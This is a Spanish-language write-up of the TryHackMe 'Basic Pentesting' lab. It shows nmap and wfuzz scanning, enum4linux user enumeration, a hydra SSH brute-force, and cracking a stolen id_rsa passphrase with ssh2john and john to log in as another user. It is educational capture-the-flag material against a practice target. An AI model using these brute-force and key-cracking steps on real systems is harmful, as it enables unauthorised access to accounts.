---
title : Máquina|Basic Pentesting
published : True
---

<div class="contenedor">
    <img src="imgs/basicPentesting/basicPentesting.png" width="160" alt="Cheese logo">
    <div>
        <p><font color="red" style="text-shadow: 5px 5px 20px red;">#</font> Dificultad: Facil </p>
        <p><font color="red" style="text-shadow: 5px 5px 20px red;">#</font> Url: <a href="https://tryhackme.com/room/basicpentestingjt" style="color: lightblue;">BasicPentesting</a></p>
    </div>
</div>


<h2><font color="white"><center># BasicPentesting</center></font></h2>

* <p>Enumerando la maquina nos damos cuenta que es una maquina Linux por le ttl de respuesta el cual es 63, no es 64 porque hay un nodo intermediario.</p>
> ping -c 1 10.10.205.174 
>
<img src="/imgs/basicPentesting/basicPentesting0.jpg"/>

* <p>Seguido miramos puerto abiertos de la maquina, y detectamos la version de los puerto abiertos</p>
> nmap -O -sV --min-rate 5000 -sS -Pn --open 10.10.205.174 -o allports
>
<img src="/imgs/basicPentesting/basicPentesting1.jpg"/>
* <p>Veamos ahora el puerto ( 80 | http ) de la maquina</p>
> 
<img src="/imgs/basicPentesting/basicPentesting2.jpg"/>

* <p>Vemos que no hay nada interesante, asi que empezamos a descubrir rutas ocultas de la pagina web, y vemos que hay una ruta llamada development.</p>
> wfuzz -t 200 --hc=404 -c -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.205.174/FUZZ
>
<img src="/imgs/basicPentesting/basicPentesting3.jpg"/>
* <p>Al mirar la los 2 archivos individualmente del directorio https://10.10.205.174/development no vemos nada interesante.</p>
>
<img src="/imgs/basicPentesting/basicPentesting4.jpg"/>
* <p>Asi que recordamos que tiene el puerto smb abierto asi que vamos a tratar de enumerarlo para poder sacar usuarios existentes</p>
> enum4linux 10.10.205.174
>
<img src="/imgs/basicPentesting/basicPentesting5.jpg"/>
>
`Tenemos 2 usuario existentes en el sistema Jay | kay.`
* <p> Teniendo esos 2 usuarios podemo hacer un ataque de fuerza bruta por ssh.</p>
> hydra -l jan -P /usr/share/wordlists/rockyou.txt 10.10.205.174 ssh
>
<img src="/imgs/basicPentesting/basicPentesting6.jpg"/>
>
`Tenemos la contraseña de jan la cual es : armando`
* <p>Ahora lo que sigue es conectarnos por ssh a ver si es valida la información</p>
> ssh jan@10.10.205.174 
>
<img src="/imgs/basicPentesting/basicPentesting7.jpg"/>
* <p>Vemos que en el directorio de kay tenemos una id_rsa.</p>
>
<img src="/imgs/basicPentesting/basicPentesting8.jpg"/>
>
* <p>A la hora de conectarnos por ssh nos pide contraseña.</p>
>
<img src="/imgs/basicPentesting/basicPentesting9.jpg"/>
* <p>Pero podemos hacerle un crack con john, nos transferimos el archivo <font color="yellow">id_rsa</font> a  nuestra maquina</p>
<img src="/imgs/basicPentesting/basicPentesting10.jpg"/>
* <p>Ahora cambiamos el archivo <font color="yellow"> a un formato hash por jhon</font>.</p>
> /usr/share/john/ssh2john.py id_rsa  > crackeame
<img src="/imgs/basicPentesting/basicPentesting11.jpg"/>
* <p>Ahora crackeamos el archivo que generamos,y obtenemos la contraseña <font color="red">beeswax</font>.</p>
>
<img src="/imgs/basicPentesting/basicPentesting12.jpg"/>
* <p>Y listo al conectarnos podemos ver la contraseña de root , sin querer deje apagar la maquina y la ip cambio a 10.10.56.225 pero el proceso es el mismo.</p>
> ssh -i id_rsa kay@10.10.56.225
>
<img src="/imgs/basicPentesting/basicPentesting13.jpg"/>
>
<p>OK maquina vulnerada</p>
